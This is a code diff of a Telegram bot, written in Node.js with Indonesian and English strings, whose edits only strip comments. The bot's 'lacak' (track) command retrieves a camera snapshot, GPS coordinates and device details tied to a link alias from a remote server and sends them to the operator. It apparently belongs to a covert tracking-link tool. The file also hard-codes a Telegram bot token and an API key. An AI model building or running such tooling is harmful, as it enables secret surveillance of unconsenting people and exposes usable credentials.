@@ -2,7 +2,6 @@ const { Telegraf, Markup } = require('telegraf');
 const axios = require('axios');
 require('dotenv').config();
 
-// --- Konfigurasi dari Environment Variables ---
 const TELEGRAM_TOKEN = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';
 const RENDER_SERVER_URL = 'https://svb.onrender.com';
 const API_KEY = 'KucingTerbangWarnaWarni123!';
@@ -18,13 +17,10 @@ const api = axios.create({
     headers: { 'X-API-KEY': API_KEY }
 });
 
-// --- Fungsi pilih bahasa ---
 function t(ctx, idText, enText) {
     const lang = ctx.from.language_code;
     return (lang && lang.toLowerCase().startsWith('id')) ? idText : enText;
 }
-
-// --- Command Handlers ---
 
 bot.command(['start', 'help'], (ctx) => {
     const helpText = t(
@@ -90,7 +86,6 @@ bot.command('lacak', async (ctx) => {
         const response = await api.get(`/api/get_data/${userId}/${alias}`);
         const { data } = response.data;
 
-        // Foto
         if (data.photoBase64) {
             const photoBuffer = Buffer.from(data.photoBase64.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
             await ctx.replyWithPhoto({ source: photoBuffer }, { caption: t(ctx, `Snapshot dari kamera ${alias}`, `Snapshot from ${alias}'s camera`) });
@@ -98,14 +93,12 @@ bot.command('lacak', async (ctx) => {
             await ctx.reply(t(ctx, "Tidak ada data foto yang diterima.", "No photo data received."));
         }
 
-        // Lokasi
         if (data.location) {
             await ctx.replyWithLocation(data.location.lat, data.location.lon);
         } else {
             await ctx.reply(t(ctx, "Tidak ada data lokasi yang diterima.", "No location data received."));
         }
 
-        // Info perangkat
         if (data.deviceInfo) {
             const infoText = t(
                 ctx,
@@ -133,9 +126,9 @@ bot.command('hapuslink', async (ctx) => {
     }
 });
 
-// --- Jalankan Bot ---
 bot.launch();
 console.log('Bot Telegraf multi-bahasa sedang berjalan...');
 
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
+
